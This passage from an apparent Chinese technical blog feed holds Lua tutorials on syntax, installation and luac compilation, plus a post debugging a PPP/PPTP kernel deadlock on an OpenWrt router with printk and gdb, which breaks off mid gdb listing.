一样也是弱类型，无需明确指定数据类型，Lua解释器自动识别或转换。</p></blockquote><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>lua 包含8个基本数据类型： <code>nil</code>, <code>boolean</code>, <code>number</code>, <code>string</code>, <code>userdata</code>, <code>function</code>, <code>thread</code>, <code>table</code></p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>nil</td><td>这个最简单，只有值nil属于该类，表示一个无效值（在条件表达式中相当于false）。</td></tr><tr><td>boolean</td><td>包含两个值：false和true。</td></tr><tr><td>number</td><td>表示双精度类型的实浮点数</td></tr><tr><td>string</td><td>字符串由一对双引号或单引号来表示</td></tr><tr><td>function</td><td>由 C 或 Lua 编写的函数</td></tr><tr><td>userdata</td><td>表示任意存储在变量中的C数据结构</td></tr><tr><td>thread</td><td>表示执行的独立线路，用于执行协同程序</td></tr><tr><td>table</td><td>Lua 中的表（table）其实是一个&quot;关联数组&quot;（associative arrays）</td></tr></tbody></table><blockquote><p><code>Lua</code> 中的表（table）其实是一个&quot;关联数组&quot;（associative arrays），数组的索引可以是数字、字符串或表类型。在 <code>Lua</code> 里，table 的创建是通过&quot;构造表达式&quot;来完成，最简单构造表达式是{}，用来创建一个空表。</p></blockquote><p>table 在 Lua 几乎是万能的，随处可见，可实现类似数组、字典、类C语言的结构体、面向对象相关等。</p><p><code>nil</code> 有点类似C语言的 <code>NULL</code> 或者 <code>void</code>，在逻辑判断中需要加双引号，并且其值等价于 <code>false</code>.</p><blockquote><p>值得注意的是，<strong>Lua 中的 0 并不代表 false</strong>, 这是与绝大多数编程语言不一样的地方。</p></blockquote><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><ul><li><code>+</code> 加法</li><li><code>-</code> 减法</li><li><code>*</code> 乘法</li><li><code>/</code> 除法</li><li><code>%</code> 取余</li><li><code>^</code> 乘幂</li><li><code>-</code> 负号</li></ul><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ul><li><code>==</code> 等于</li><li><code>~=</code> 不等于</li><li><code>&gt;</code> 大于</li><li><code>&lt;</code> 小于</li><li><code>&gt;=</code> 大于等于</li><li><code>&lt;=</code> 小于等于</li></ul><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul><li><code>and</code> 与</li><li><code>or</code> 或</li><li><code>not</code> 非</li></ul><h3 id="其它运算符"><a href="#其它运算符" class="headerlink" title="其它运算符"></a>其它运算符</h3><ul><li><code>..</code> 连接字符串</li><li><code>#</code> 返回字符串或表的长度，如 #&quot;Hello&quot; 返回 5</li></ul><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h3><pre><code class="lua">while (codition)do    statementsend</code></pre><p>注意与shell不同，lua 是以 <code>end</code> 结束，不是 <code>done</code>。while 例程如下：</p><pre><code class="lua">i=10while (i &gt; 0)do    print (&quot;i:&quot;, i)    i = i-1end</code></pre><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><ul><li>数值循环</li></ul><pre><code class="lua">for var=exp1,exp2,exp3 do    statementsend</code></pre><p><code>var</code> 从 exp1 以 exp3 为步进，逐渐变化到exp2, 类似C语言中的</p><pre><code class="c">for (var = exp1; var &lt; exp2; var += exp3) &#123;    statements&#125;</code></pre><p>lua 数值 for 循环例程</p><pre><code class="lua">for var=1,10,2 do    print(var)end</code></pre><ul><li>泛型循环</li></ul><p>lua 还有另外一种for循环，被称为 <strong>泛型</strong> for 循环。与 Python 很像，就是迭代输出。</p><pre><code class="lua">a = &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;for i, v in ipairs(a) do    print(i, v) -- i: index, v: valueend </code></pre><h3 id="repeat-until-循环"><a href="#repeat-until-循环" class="headerlink" title="repeat...until 循环"></a>repeat...until 循环</h3><pre><code class="lua">repeat    statementsuntil( condition )</code></pre><p>乍一看和 C 的 <code>do...while</code> 很像，但实际不一样， <code>do...while</code> 是当 while 条件满足时执行，而 <code>repeat...until</code> 则相反，当<code>until</code>条件不满足时执行。其实 lua 的也很好理解，不断重复 (repeat) 某件事直到 (until) 满足某个条件才停止。思想是差不多的。</p><p>实例如下：</p><pre><code class="lua">i = 1repeat   print(&quot;i:&quot;, i)   i = i + 1until( i &gt; 10 )</code></pre><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><pre><code class="lua">if (condition)then    statementsendif (condition-1)then    statements-1elseif (condition-2)then    statements-2else    statements-3end</code></pre><p>if elseif else 例程</p><pre><code class="lua">a = 1if( a == 1 )then   print(&quot;a is 1&quot; )elseif( a == 2 )then     print(&quot;a is 2&quot; )elseif( a == 3 )then   print(&quot;a is 3&quot; )else   print(&quot;not found a&quot; )end</code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre><code class="lua">optional_function_scope function function_name( argument1, argument2, argument3..., argumentn)    function_body    return result_params_comma_separatedend</code></pre><ul><li><code>optional_function_scope</code>: 该参数是可选的，指定函数是全局函数还是局部函数，未设置该参数默认为全局函数，如果你需要设置函数为局部函数需要使用关键字 local。</li><li><code>function_name</code>: 指定函数名称。</li><li><code>argument1, argument2, argument3..., argumentn</code>: 函数参数，多个参数以逗号隔开，函数也可以不带参数。</li><li><code>function_body</code>: 函数体，函数中需要执行的代码语句块。</li><li><code>result_params_comma_separated</code>: 函数返回值，Lua语言函数可以返回多个值，每个值以逗号隔开。</li></ul><p>例程</p><pre><code class="lua">function add(a, b)    return a + b;endprint(add(1,2))</code></pre><h3 id="多返回值"><a href="#多返回值" class="headerlink" title="多返回值"></a>多返回值</h3><p>lua 的函数可以返回多值，比如在一个数组中找到最大值及其所在位置。</p><pre><code class="lua">function maximum (a)    local mi = 1             -- max index    local m = a[mi]          -- max value    for i,val in ipairs(a) do       if val &gt; m then           mi = i           m = val       end    end    return m, miendprint(maximum(&#123;2,12,22,14,8&#125;))</code></pre><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>和C类似，lua也支持可变参数，使用 <code>...</code> 代表可变参数。</p><pre><code class="lua">function add(...)local s = 0  for i, v in ipairs&#123;...&#125; do   --/* &#123;...&#125; is a array */    s = s + v  end  return sendprint(add(1,2,3,4,5,6))</code></pre><h2 id="执行系统指令"><a href="#执行系统指令" class="headerlink" title="执行系统指令"></a>执行系统指令</h2><ul><li>os.execute</li></ul><pre><code class="lua">os.execute(&#39;date&#39;)os.execute(&#39;ls&#39;)</code></pre><ul><li>io.popen</li></ul><pre><code class="lua">fd = io.popen(&#39;date&#39;)out = fd:read(&quot;*all&quot;)fd:close()print(out)</code></pre><blockquote><p><code>io.popen</code> 需要 lua 在编译时启用 <code>LUA_USE_LINUX</code> 这个宏，否则不会支持。</p></blockquote><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://www.runoob.com/lua/lua-tutorial.html">Lua 教程</a></li><li><a href="https://www.runoob.com/manual/lua53doc/contents.html">Lua 5.3 参考手册</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Lua </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lua </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lua 语言的基本使用</title>
      <link href="2020/12/23/lua/"/>
      <url>2020/12/23/lua/</url>
      
        <content type="html"><![CDATA[<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>在联网状态下，Ubuntu可以直接apt安装。</p><pre><code class="bash">sudo apt install lua</code></pre><p>如果是不直接联网的服务器，并且没有root权限的情况下，需要先在联网PC上下载后导入，再编译安装。</p><pre><code class="bash">wget http://www.lua.org/ftp/lua-5.1.5.tar.gz# copy lua-5.1.5.tar.gz to server by scp or ftptar -xvf lua-5.1.5.tar.gzcd lua-5.1.5sed -i &#39;s/\/usr\/local/~\/bin\/local/&#39; Makefilemake genericmake install</code></pre><p>默认安装目录是<code>/usr/local</code>, 如果没有root权限，需要修改Makefile，将其改为指定目录(~/bin/local)，上面通过sed修改。</p><p>值得注意的是，Lua 如果按 make linux 编译，会要求支持readline，所以需要先安装依赖 <code>libreadline-dev</code></p><pre><code class="bash">sudo apt-get install libreadline-dev</code></pre><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>lua与Python类似，也是脚本型语言，同时也可以直接在shell中边解释边执行。</p><pre><code class="lua">$ lua&gt; print(&quot;hello world!&quot;)hello world!</code></pre><p><code>CTRL-C</code> 或 <code>CTRL-D</code> 退出。如果是执行脚本文件，如下面的 <code>hello.lua</code> 。</p><pre><code class="lua">#!/usr/bin/env lua-- file: hello.luaprint(&quot;hello world!&quot;)</code></pre><p>执行也和其它脚本一样，可以使用 lua 执行，或者添加可执行权限后再直接执行。</p><pre><code class="bash">$ lua hello.luahello world!$ chmod +x hello.lua$ ./hello.luahello world!</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>lua 可以和 C 语言一样编译成二进制文件，同样以上面的 <code>hello.lua</code> 为例。</p><pre><code class="bash">$ luac hello.lua$ lshello.lua luac.out$ lua luac.outhello world!</code></pre><p>使用 <code>luac</code> 编译后，默认生成 <code>luac.out</code> 文件，但是执行的时候无法直接 <code>./luac.out</code> 执行，加上可执行权限也一样，必须使用 lua 去执行。</p><p>例外，可以通过 <code>luac</code> 的 <code>-o</code> 参数去指定编译后的文件。</p><pre><code class="bash">$ luac -o hello hello.lua$ lshello hello.lua$ lua hellohello world!</code></pre><p>hexdump 看下编译后 <code>hello</code> ,还是可以看到许多明文信息的。但是使用objdump是无法反汇编的。会提示无法识别文件格式。</p><pre><code class="bash">$ hexdump -C hello00000000  1b 4c 75 61 50 01 04 08  08 06 08 09 09 08 b6 09  |.LuaP...........|00000010  93 68 e7 f5 7d 41 0b 00  00 00 00 00 00 00 40 68  |.h..&#125;A........@h|00000020  65 6c 6c 6f 2e 6c 75 61  00 00 00 00 00 00 00 00  |ello.lua........|00000030  02 04 00 00 00 04 00 00  00 04 00 00 00 04 00 00  |................|00000040  00 04 00 00 00 00 00 00  00 00 00 00 00 02 00 00  |................|00000050  00 04 06 00 00 00 00 00  00 00 70 72 69 6e 74 00  |..........print.|00000060  04 0d 00 00 00 00 00 00  00 68 65 6c 6c 6f 20 77  |.........hello w|00000070  6f 72 6c 64 21 00 00 00  00 00 04 00 00 00 05 00  |orld!...........|00000080  00 00 00 00 00 00 41 00  00 01 00 00 00 00 59 00  |......A.......Y.|00000090  01 00 00 00 00 00 1b 80  00 00 00 00 00 00        |..............|0000009e$ lua objdump -D helloobjdump: hello: file format not recognized</code></pre><p>最后，使用<code>luac</code>的 <code>-s</code> 参数可以去掉 debug 信息，减小文件大小，同时也提高反汇编的难度。</p><pre><code class="bash">-s  strip  debug  information before writing the output file.  This saves     some space in very large chunks, but if errors occur when running these     chunks, then the error messages may not contain the full information they     usually do (line numbers and names of locals are lost).</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.runoob.com/lua/lua-tutorial.html">lua 菜鸟教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Lua </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lua </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 gdb 解析 ppp driver crash log</title>
      <link href="2020/12/17/gdb-kernel/"/>
      <url>2020/12/17/gdb-kernel/</url>
      
        <content type="html"><![CDATA[<p>由于项目整合，经过一次大版本升级后的项目，继承了大家族中许多新的特性，然而在正常功能测试中崩溃了，而且还是kernel crash, 会导致reboot的那种。本文就此问题重现、调试分析过程予以归纳总结。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>PPTP 拨号上网模式下，Router 在添加特定静态路由后crash. 添加路由的原因在本文讨论内容中不重要，因此略过。</p><h2 id="问题再现"><a href="#问题再现" class="headerlink" title="问题再现"></a>问题再现</h2><p>实际测试过程中寻找重现方法耗时较长，经过大量实验后简化如下：</p><ol><li>连接 WAN Port</li><li>PPTP 拨号上网</li></ol><p>拨号成功后，查看 <code>WAN</code> 口及 <code>ppp0</code> 的 IP.</p><pre><code class="bash">root@model:$ ifconfig brwanbrwan     Link encap:Ethernet  HWaddr 00:13:2F:34:42:59          inet addr:10.0.0.84  Bcast:10.156.23.255  Mask:255.255.254.0          inet6 addr: fe80::203:7fff:fe94:229/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:3547 errors:0 dropped:541 overruns:0 frame:0          TX packets:174 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:354037 (345.7 KiB)  TX bytes:16378 (15.9 KiB)root@model:$ ifconfig ppp0ppp0      Link encap:Point-to-Point Protocol          inet addr:192.168.0.234  P-t-P:192.168.0.1  Mask:255.255.255.255          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1436  Metric:1          RX packets:5 errors:0 dropped:0 overruns:0 frame:0          TX packets:7 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:3          RX bytes:84 (84.0 B)  TX bytes:233 (233.0 B)</code></pre><p>确认拨号成功，同时查看一下当前路由。</p><pre><code class="txt">root@model:$ route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         0.0.0.0         0.0.0.0         U     0      0        0 ppp010.0.0.1        10.0.23.254     255.255.255.255 UGH   0      0        0 brwan10.0.0.2        10.0.23.254     255.255.255.255 UGH   0      0        0 brwan10.0.22.0       0.0.0.0         255.255.254.0   U     0      0        0 brwan192.168.0.1     0.0.0.0         255.255.255.255 UH    0      0        0 ppp0192.168.1.0     0.0.0.0         255.255.255.0   U     0      0        0 br0</code></pre><ol start="3"><li>添加以下静态路由</li></ol><pre><code class="bash">route add -net 10.0.23.10 netmask 255.255.255.255 dev ppp0</code></pre><p>再次查看路由，可以看到静态路由已经添加成功。</p><pre><code class="bash">root@model:$ route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         0.0.0.0         0.0.0.0         U     0      0        0 ppp010.0.0.1        10.0.23.254     255.255.255.255 UGH   0      0        0 brwan10.0.0.2        10.0.23.254     255.255.255.255 UGH   0      0        0 brwan10.0.22.0       0.0.0.0         255.255.254.0   U     0      0        0 brwan10.0.23.10      0.0.0.0         255.255.255.255 UH    0      0        0 ppp0192.168.0.1     0.0.0.0         255.255.255.255 UH    0      0        0 ppp0192.168.1.0     0.0.0.0         255.255.255.0   U     0      0        0 br0</code></pre><p>前面为什么说是特定路由呢？因为 <code>10.0.23.10</code> 正是 PPTP Server 的 IP 地址，不加该路由前，访问 PPTP Server 的数据包会从 <code>brwan</code> 出去，添加后将从 <code>ppp0</code> 出去，这是个关键点。</p><p>添加路由后，等待10秒左右，kernel 将会 crash, 并且会打印出以下 crash log, 这也是本文的研究对象。</p><pre><code class="log">INFO: rcu_preempt self-detected stall on CPU &#123; 0&#125;  (t=2100 jiffies g=4282090 c=4282089 q=40763)CPU: 0 PID: 10879 Comm: pppd Tainted: P             3.14.77 #2[&lt;c021eb54&gt;] (unwind_backtrace) from [&lt;c021bc4c&gt;] (show_stack+0x10/0x14)[&lt;c021bc4c&gt;] (show_stack) from [&lt;c03b2b08&gt;] (dump_stack+0x78/0x98)INFO: rcu_preempt detected stalls on CPUs/tasks: &#123; 0&#125; (detected by 1, t=2102 jiffies, g=4282090, c=4282089, q=40778)Task dump for CPU 0:pppd            R running      0 10879      1 0x00000002[&lt;c020fc4c&gt;] (__schedule) from [&lt;d922e000&gt;] (0xd922e000)[&lt;c03b2b08&gt;] (dump_stack) from [&lt;c026e390&gt;] (rcu_check_callbacks+0x230/0x6a0)[&lt;c026e390&gt;] (rcu_check_callbacks) from [&lt;c02391c0&gt;] (update_process_times+0x38/0x58)[&lt;c02391c0&gt;] (update_process_times) from [&lt;c0276a58&gt;] (tick_sched_timer+0x44/0x74)[&lt;c0276a58&gt;] (tick_sched_timer) from [&lt;c024a874&gt;] (__run_hrtimer+0x50/0xc8)[&lt;c024a874&gt;] (__run_hrtimer) from [&lt;c024b0b4&gt;] (hrtimer_interrupt+0x12c/0x288)[&lt;c024b0b4&gt;] (hrtimer_interrupt) from [&lt;c04e2828&gt;] (arch_timer_handler_virt+0x28/0x30)[&lt;c04e2828&gt;] (arch_timer_handler_virt) from [&lt;c0268d28&gt;] (handle_percpu_devid_irq+0x68/0x84)[&lt;c0268d28&gt;] (handle_percpu_devid_irq) from [&lt;c0265698&gt;] (generic_handle_irq+0x20/0x30)[&lt;c0265698&gt;] (generic_handle_irq) from [&lt;c0218e74&gt;] (handle_IRQ+0x68/0x90)[&lt;c0218e74&gt;] (handle_IRQ) from [&lt;c0208514&gt;] (gic_handle_irq+0x3c/0x5c)[&lt;c0208514&gt;] (gic_handle_irq) from [&lt;c0209580&gt;] (__irq_svc+0x40/0x70)Exception stack(0xd922fd58 to 0xd922fda0)fd40:                                                       de01cadc 00000000fd60: 0000013c 0000013b d7e444c0 de01cae8 de01cadc 00000000 ffffffff fffffffffd80: 00000001 d7e44514 00000000 d922fda0 bf11d598 c0212a44 20000013 ffffffff[&lt;c0209580&gt;] (__irq_svc) from [&lt;c0212a44&gt;] (_raw_spin_lock_bh+0x48/0x5c)[&lt;c0212a44&gt;] (_raw_spin_lock_bh) from [&lt;bf11d598&gt;] (ppp_release_channels+0xa4/0x5cc [ppp_generic])[&lt;bf11d598&gt;] (ppp_release_channels [ppp_generic]) from [&lt;bf11f91c&gt;] (ppp_input+0x590/0x658 [ppp_generic])[&lt;bf11f91c&gt;] (ppp_input [ppp_generic]) from [&lt;bf11fb4c&gt;] (ppp_start_xmit+0x168/0x174 [ppp_generic])[&lt;bf11fb4c&gt;] (ppp_start_xmit [ppp_generic]) from [&lt;c05305dc&gt;] (dev_hard_start_xmit+0x2d4/0x420)[&lt;c05305dc&gt;] (dev_hard_start_xmit) from [&lt;c0546d2c&gt;] (sch_direct_xmit+0x6c/0x1b0)[&lt;c0546d2c&gt;] (sch_direct_xmit) from [&lt;c0530918&gt;] (__dev_queue_xmit+0x1f0/0x418)[&lt;c0530918&gt;] (__dev_queue_xmit) from [&lt;c0571da0&gt;] (ip_finish_output+0x43c/0x49c)[&lt;c0571da0&gt;] (ip_finish_output) from [&lt;bf064f7c&gt;] (pptp_xmit+0x49c/0x51c [pptp])[&lt;bf064f7c&gt;] (pptp_xmit [pptp]) from [&lt;bf120ea4&gt;] (ppp_ioctl+0xe20/0xe7c [ppp_generic])[&lt;bf120ea4&gt;] (ppp_ioctl [ppp_generic]) from [&lt;bf120ff0&gt;] (ppp_write+0xe0/0x104 [ppp_generic])[&lt;bf120ff0&gt;] (ppp_write [ppp_generic]) from [&lt;c02c1698&gt;] (vfs_write+0xcc/0x160)[&lt;c02c1698&gt;] (vfs_write) from [&lt;c02c1ba0&gt;] (SyS_write+0x40/0x80)[&lt;c02c1ba0&gt;] (SyS_write) from [&lt;c0208c80&gt;] (ret_fast_syscall+0x0/0x38)BUG: soft lockup - CPU#1 stuck for 22s! [ifconfig:6333]</code></pre><h2 id="解析-crash-log"><a href="#解析-crash-log" class="headerlink" title="解析 crash log"></a>解析 crash log</h2><p>针对以上crash log, 我们要找出 Root Cause，需要分析其中的关键信息，然后从代码中找到对应位置。</p><pre><code class="bash">CPU: 0 PID: 10879 Comm: pppd Tainted: P             3.14.77 #2</code></pre><p>首先，最简单是查看用户空间的信息，可以看到，Comm 后输出的是 <code>pppd</code>, 显然与 <code>pppd</code> 有关，<strong>pppd</strong> 作为用户空间的一个 Daemon, 用于处理 pptp, l2tp 以及 pppoe 相关功能，并且会与 kernel 中的 ppp driver 通信。</p><p>但是使用 <code>strace pid-of-pppd</code> 并不能很好的查找到问题所在，因为 crash 发生时，strace 也无法打印信息。</p><p>继续查看后面的log，下面这段log像是进程调度相关的信息，并不能直观看出是什么问题。</p><pre><code class="log">[&lt;c020fc4c&gt;] (__schedule) from [&lt;d922e000&gt;] (0xd922e000)[&lt;c03b2b08&gt;] (dump_stack) from [&lt;c026e390&gt;] (rcu_check_callbacks+0x230/0x6a0)[&lt;c026e390&gt;] (rcu_check_callbacks) from [&lt;c02391c0&gt;] (update_process_times+0x38/0x58)[&lt;c02391c0&gt;] (update_process_times) from [&lt;c0276a58&gt;] (tick_sched_timer+0x44/0x74)[&lt;c0276a58&gt;] (tick_sched_timer) from [&lt;c024a874&gt;] (__run_hrtimer+0x50/0xc8)[&lt;c024a874&gt;] (__run_hrtimer) from [&lt;c024b0b4&gt;] (hrtimer_interrupt+0x12c/0x288)[&lt;c024b0b4&gt;] (hrtimer_interrupt) from [&lt;c04e2828&gt;] (arch_timer_handler_virt+0x28/0x30)[&lt;c04e2828&gt;] (arch_timer_handler_virt) from [&lt;c0268d28&gt;] (handle_percpu_devid_irq+0x68/0x84)[&lt;c0268d28&gt;] (handle_percpu_devid_irq) from [&lt;c0265698&gt;] (generic_handle_irq+0x20/0x30)[&lt;c0265698&gt;] (generic_handle_irq) from [&lt;c0218e74&gt;] (handle_IRQ+0x68/0x90)[&lt;c0218e74&gt;] (handle_IRQ) from [&lt;c0208514&gt;] (gic_handle_irq+0x3c/0x5c)[&lt;c0208514&gt;] (gic_handle_irq) from [&lt;c0209580&gt;] (__irq_svc+0x40/0x70)Exception stack(0xd922fd58 to 0xd922fda0)</code></pre><p>继续往后看，下面这部分出现了 ppp 相关的信息，其中 ppp_generic 正是 ppp driver 对应的内核模块 <code>ppp_generic.ko</code> , 而 pptp 对应的是内核模块 <code>pptp.ko</code>. 所以可以大致确定是 ppp driver 引发的 crash.</p><pre><code class="log">fd40:                                                       de01cadc 00000000fd60: 0000013c 0000013b d7e444c0 de01cae8 de01cadc 00000000 ffffffff fffffffffd80: 00000001 d7e44514 00000000 d922fda0 bf11d598 c0212a44 20000013 ffffffff[&lt;c0209580&gt;] (__irq_svc) from [&lt;c0212a44&gt;] (_raw_spin_lock_bh+0x48/0x5c)[&lt;c0212a44&gt;] (_raw_spin_lock_bh) from [&lt;bf11d598&gt;] (ppp_release_channels+0xa4/0x5cc [ppp_generic])[&lt;bf11d598&gt;] (ppp_release_channels [ppp_generic]) from [&lt;bf11f91c&gt;] (ppp_input+0x590/0x658 [ppp_generic])[&lt;bf11f91c&gt;] (ppp_input [ppp_generic]) from [&lt;bf11fb4c&gt;] (ppp_start_xmit+0x168/0x174 [ppp_generic])[&lt;bf11fb4c&gt;] (ppp_start_xmit [ppp_generic]) from [&lt;c05305dc&gt;] (dev_hard_start_xmit+0x2d4/0x420)[&lt;c05305dc&gt;] (dev_hard_start_xmit) from [&lt;c0546d2c&gt;] (sch_direct_xmit+0x6c/0x1b0)[&lt;c0546d2c&gt;] (sch_direct_xmit) from [&lt;c0530918&gt;] (__dev_queue_xmit+0x1f0/0x418)[&lt;c0530918&gt;] (__dev_queue_xmit) from [&lt;c0571da0&gt;] (ip_finish_output+0x43c/0x49c)[&lt;c0571da0&gt;] (ip_finish_output) from [&lt;bf064f7c&gt;] (pptp_xmit+0x49c/0x51c [pptp])[&lt;bf064f7c&gt;] (pptp_xmit [pptp]) from [&lt;bf120ea4&gt;] (ppp_ioctl+0xe20/0xe7c [ppp_generic])[&lt;bf120ea4&gt;] (ppp_ioctl [ppp_generic]) from [&lt;bf120ff0&gt;] (ppp_write+0xe0/0x104 [ppp_generic])[&lt;bf120ff0&gt;] (ppp_write [ppp_generic]) from [&lt;c02c1698&gt;] (vfs_write+0xcc/0x160)[&lt;c02c1698&gt;] (vfs_write) from [&lt;c02c1ba0&gt;] (SyS_write+0x40/0x80)[&lt;c02c1ba0&gt;] (SyS_write) from [&lt;c0208c80&gt;] (ret_fast_syscall+0x0/0x38)</code></pre><p>然后从其中的 <code>_raw_spin_lock_bh</code> 可以猜出可能是死锁(dead lock)问题.</p><pre><code class="log">[&lt;c0212a44&gt;] (_raw_spin_lock_bh) from [&lt;bf11d598&gt;] (ppp_release_channels+0xa4/0x5cc [ppp_generic])</code></pre><p>但是具体怎么造成死锁的，以及和添加的静态路由有没有关系？继续 debug.</p><h3 id="printk"><a href="#printk" class="headerlink" title="printk"></a>printk</h3><p>根据以上 log 可知，<code>ppp_generic</code> 会通过 <code>ppp_write</code> 调用 <code>ppp_ioctl</code> 继而调用 <code>pptp_xmit</code>, 那么先来看看内核驱动代码中的 <code>ppp_write</code>.</p><ul><li>drivers/net/ppp/ppp_generic.c</li></ul><pre><code class="c">static ssize_t ppp_write(struct file *file, const char __user *buf,                         size_t count, loff_t *ppos)&#123;    struct ppp_file *pf = file-&gt;private_data;    struct sk_buff *skb;    ssize_t ret;    if (!pf)        return -ENXIO;    ret = -ENOMEM;    skb = alloc_skb(count + pf-&gt;hdrlen, GFP_KERNEL);    if (!skb)        goto out;    skb_reserve(skb, pf-&gt;hdrlen);    ret = -EFAULT;    if (copy_from_user(skb_put(skb, count), buf, count)) &#123;        kfree_skb(skb);        goto out;    &#125;    skb_queue_tail(&amp;pf-&gt;xq, skb);    switch (pf-&gt;kind) &#123;    case INTERFACE:        ppp_xmit_process(PF_TO_PPP(pf));        break;    case CHANNEL:        ppp_channel_push(PF_TO_CHANNEL(pf));        break;    &#125;    ret = count; out:    return ret;&#125;</code></pre><p>这里并没有直接调用 <code>ppp_ioctl</code>, 但是可以知道发送数据需要通过 <code>ppp_xmit_process</code> 或者 <code>ppp_channel_push</code> 完成。</p><pre><code class="c">    switch (pf-&gt;kind) &#123;    case INTERFACE:        printk(&quot;Using ppp_xmit_process...\n&quot;);        ppp_xmit_process(PF_TO_PPP(pf));        break;    case CHANNEL:        printk(&quot;Using ppp_channel_push...\n&quot;);        ppp_channel_push(PF_TO_CHANNEL(pf));        break;    &#125;</code></pre><p>为此，使用 <code>printk</code> 打印 log 确定是经过 <code>ppp_channel_push</code>. 那么再来看看这个函数长啥样。</p><pre><code class="c">/* * Try to send data out on a channel. */static voidppp_channel_push(struct channel *pch)&#123;    struct sk_buff *skb;    struct ppp *ppp;    spin_lock_bh(&amp;pch-&gt;downl);    if (pch-&gt;chan) &#123;        while (!skb_queue_empty(&amp;pch-&gt;file.xq)) &#123;            skb = skb_dequeue(&amp;pch-&gt;file.xq);            if (!pch-&gt;chan-&gt;ops-&gt;start_xmit(pch-&gt;chan, skb)) &#123;                /* put the packet back and try again later */                skb_queue_head(&amp;pch-&gt;file.xq, skb);                break;            &#125;        &#125;    &#125; else &#123;        /* channel got deregistered */        skb_queue_purge(&amp;pch-&gt;file.xq);    &#125;    spin_unlock_bh(&amp;pch-&gt;downl);    /* see if there is anything from the attached unit to be sent */    if (skb_queue_empty(&amp;pch-&gt;file.xq)) &#123;        read_lock_bh(&amp;pch-&gt;upl);        ppp = pch-&gt;ppp;        if (ppp)            ppp_xmit_process(ppp);        read_unlock_bh(&amp;pch-&gt;upl);    &#125;&#125;</code></pre><p>注意这里有个加锁操作 <code>spin_lock_bh(&amp;pch-&gt;downl)</code>, 这里先不管。继续加printk，确定是从下面的语句访问的 <code>pptp_xmit</code>.</p><pre><code class="c">            if (!pch-&gt;chan-&gt;ops-&gt;start_xmit(pch-&gt;chan, skb)) &#123;</code></pre><p>按这个思路可以把执行顺序列出来。</p><ol><li>ppp_write [ppp_generic] &lt;- ppp_channel_push [ppp_generic]</li><li>ppp_channel_push [ppp_generic] &lt;- start_xmit [ppp_generic]</li><li>start_xmit [ppp_generic] &lt;- pptp_xmit [pptp]</li><li>pptp_xmit [pptp] &lt;- ip_local_out []</li><li>ip_local_out [] &lt;- ...</li><li>... &lt;- ppp_start_xmit [ppp_generic]</li></ol><p>但是其中有部分不是 ppp driver 的code, 所以中间部分就没细究。最终是又回到 ppp_generic. 到这还是无法看出哪里出的问题。当时着急出release，又有了临时的workaroud，就把这个问题搁置了。</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>最后还是组长通过 gdb 破案了，不过注意需要使用 toolchain 里的 gdb.</p><ul><li>gdb: ./staging_dir/toolchain-.../bin/arm-openwrt-linux-dgb</li><li>ppp_generic.ko: build_dir/target.../linux-ipq806x/linux-.../drivers/net/ppp/ppp_generic.ko</li></ul><p>使用 gdb 中的 &quot;list&quot; 指令，简写 &quot;l&quot; 也可以，后面接地址、函数名或者行数</p><pre><code class="bash">(gdb) list *Addr(gdb) list FUNCTION(gdb) list LINE</code></pre><p>使用该指令，以 crash log 中给出的地址为参数，执行结果如下：</p><pre><code class="bash">$ ./staging_dir/toolchain-.../bin/arm-openwrt-linux-dgb \  build_dir/target.../linux-ipq806x/linux-.../drivers/net/ppp/ppp_generic.ko(gdb) list *(ppp_write+0xe0)0x3ff0 is in ppp_write (drivers/net/ppp/ppp_generic.c:568).563             case INTERFACE:564                     ppp_xmit_process(PF_TO_PPP(pf));565                     break;566             case CHANNEL:567                     ppp_channel_push(PF_TO_CHANNEL(pf));568                     break;569             &#125;570571             ret = count;572(gdb) list *(ppp_ioctl+0xe20)0x3ea4 is in ppp_channel_push (drivers/net/ppp/ppp_generic.c:1811).18061807            spin_lock_bh(&amp;pch-&gt;downl);1808            if (pch-&gt;chan) &#123;1809                    while (!skb_queue_empty(&amp;pch-&gt;file.xq)) &#123;1810                            skb = skb_dequeue(&amp;pch-&gt;file.xq);1811                            if 